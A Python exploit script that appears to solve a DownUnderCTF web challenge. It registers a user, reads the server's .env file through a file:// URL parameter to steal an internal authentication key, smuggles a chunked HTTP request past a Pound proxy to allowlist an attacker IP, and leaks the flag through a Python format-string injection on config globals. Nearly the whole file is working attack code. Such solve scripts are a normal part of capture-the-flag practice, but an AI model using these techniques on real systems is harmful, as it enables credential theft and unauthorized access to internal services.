import requests
import socket
import time
import re
from urllib.request import urlopen, Request

TARGET_FLASK = "http://dev.customer.ductf"  # Public Flask service
TARGET_POUND = "localhost"              # Proxy in front of h11 backend
POUND_PORT = 80                         # Pound proxy port
ATTACKER_IP = "172.22.0.1"  # Attacker's IP address, change as needed

def leak_internal_authentication_key(session):
    print("[*] Leaking internal API key via /proc/self/environ...")
    payload = {
        "url": " file:///proc/self/cwd/.env"
    }
    res = session.post(TARGET_FLASK + "/", data=payload)
    if res.status_code != 200:
        print(f"[!] Unexpected status code: {res.status_code}")
        return None

    match = re.search(r'AUTHENTICATION_KEY=([A-Za-z0-9_]+)', res.text)
    if match:
        key = match.group(1)
        print(f"[+] Leaked internal API key: {key}")
        return session, key
    else:
        print("[!] Key not found in response")
        return None, None


def build_smuggled_request(authentication_key):
    smuggled_payload = (
        f"GET /update_allowlist?ip={ATTACKER_IP} HTTP/1.1\r\n"
        "Host: dev.rpc-service.ductf\r\n"
        f"Auth-Key: {authentication_key}\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )

    payload = (
        "GET /ping HTTP/1.1\r\n"
        "Host: dev.rpc-service.ductf\r\n"
        "Connection: keep-alive\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5\r\n"
        "AAAAAXX2\r\n"
        f"{len(smuggled_payload) + 4:X}\r\n" # Plus 4 for the "\r\n\r\n" before the smuggled payload (next 2 lines)
        "0\r\n"
        "\r\n"
        f"{smuggled_payload}"
    )

    return payload.encode()


def send_smuggled_request(internal_authentication_key):
    print("[*] Sending smuggled request...")

    with socket.create_connection((TARGET_POUND, POUND_PORT)) as s:
        payload = build_smuggled_request(internal_authentication_key)
        print(f"[*] Payload length: {len(payload)} bytes")

        s.sendall(payload)

        time.sleep(1)
        print("[*] Awaiting response...")

        response = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
        except Exception:
            pass
        print(response)
        if not response:
            print("[+] No response received from the server. Payload likely successfully smuggled.")
            get_flag(internal_authentication_key)
            return


def login(session):
    print("[*] Logging in...")
    res = session.post(TARGET_FLASK + "/login", data={
        "username": "newuser",
        "password": "newpassword"
    }, allow_redirects=False)

    if res.status_code == 302:
        print("[+] Login successful")
    else:
        print("[!] Login failed")

    return session


def register(session):
    print("[*] Registering new user...")
    res = session.post(TARGET_FLASK + "/register", data={
        "username": "newuser",
        "password": "newpassword"
    }, allow_redirects=False)

    if res.status_code == 302:
        print("[+] Registration successful")
    else:
        print("[!] Registration failed")

    return session

def get_flag(authentication_key=None):
    print("[*] Fetching flag...")
    req = Request("http://dev.rpc-service.ductf/stats?{config.__init__.__globals__[FLAG]}")
    req.add_header("auth-key", authentication_key)
    try:
        res = urlopen(req).read()
    except:
        print("[+] Caused an error successfully")
    res = requests.get("http://dev.rpc-service.ductf/stats?get_log=true&get_config=true", headers = {"Auth-key": authentication_key})
    flag = re.search(r'DUCTF\{.*?\}', res.text).group(0)
    if flag:
        print(f"[+] Flag: {flag}")
    else:
        print(f"[-] Flag not found: {res.text}")

def main():
    session = requests.Session()
    session = register(session)
    session = login(session)

    session, authentication_key = leak_internal_authentication_key(session)
    if not authentication_key:
        print("[!] Could not retrieve key, aborting.")
        return

    send_smuggled_request(authentication_key)

if __name__ == "__main__":
    main()
